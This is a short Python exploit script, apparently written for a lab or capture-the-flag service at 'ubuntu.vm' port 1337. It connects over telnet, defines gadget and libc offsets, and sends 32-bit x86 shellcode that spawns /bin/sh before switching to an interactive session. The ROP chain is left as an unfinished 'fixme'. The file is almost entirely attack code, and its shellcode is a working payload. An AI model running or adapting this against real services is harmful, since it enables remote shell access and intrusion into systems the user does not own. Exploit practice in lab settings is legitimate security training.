#!/usr/bin/env python

import telnetlib
import struct
import re
from time import sleep

# /bin/sh
sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

def p(a):
    return struct.pack('<I', a)

host = 'ubuntu.vm'
port = 1337

trigger = 200

XCHG_OFFSET = 0x78d
MAIN_OFFSET = 0x806
DATA_OFFSET = 0x2040

PUTS_OFFSET = 0x00062b30

conn = telnetlib.Telnet(host, port)
s = conn.get_socket()
conn.read_until("your input: ")

# fixme : write exploit and ROP chain

sleep(2)
s.send(sc)
conn.interact()
